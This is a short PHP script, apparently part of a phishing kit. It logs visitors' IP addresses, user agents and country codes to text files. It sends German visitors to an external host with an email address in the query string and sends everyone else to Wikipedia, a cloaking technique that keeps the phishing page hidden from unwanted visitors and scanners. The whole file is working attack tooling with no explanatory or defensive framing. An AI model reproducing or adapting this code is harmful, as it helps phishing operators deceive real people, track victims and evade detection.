<?
include('d.php');
$ip = getenv("REMOTE_ADDR");
$parts = parse_url($url);
parse_str($parts['query'], $query);
$main = $query['em'];
if ($kode_negara == "de") {
    $file = fopen("usblocked.txt","a");
    $YR = fopen("usblocked.txt","a");
	fwrite($YR,$ip . '|' . $agent . '|' . $kode_negara."\n");
   header('Location: http://pharmalife.co.ke:8080/?em=yyyh@live.com&amp;key=olololol');
}
else {


header("Location: http://sq.wikipedia.org/");
    $YR = fopen("v.txt","a");
	fwrite($YR,$ip . '|' . $agent . '|' . $kode_negara."\n");
}
?>